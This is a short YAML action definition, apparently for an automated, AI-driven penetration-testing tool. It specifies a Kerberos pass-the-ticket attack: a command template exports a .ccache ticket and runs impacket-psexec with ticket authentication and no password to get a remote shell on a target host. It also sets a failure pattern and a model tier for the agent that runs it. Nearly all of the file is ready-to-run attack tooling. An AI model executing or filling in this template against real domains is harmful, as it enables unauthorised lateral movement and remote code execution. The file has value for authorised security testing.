name: passtheticket
category: ad
description: Pass-the-ticket authentication with .ccache
preconditions:
  - domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: "export KRB5CCNAME='{ccache_file}'; impacket-psexec -k -no-pass {domain}/{target_user}@{target_ip}"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Uses Kerberos ticket (.ccache) for authentication instead of password/hash. Works with all impacket tools via -k flag."
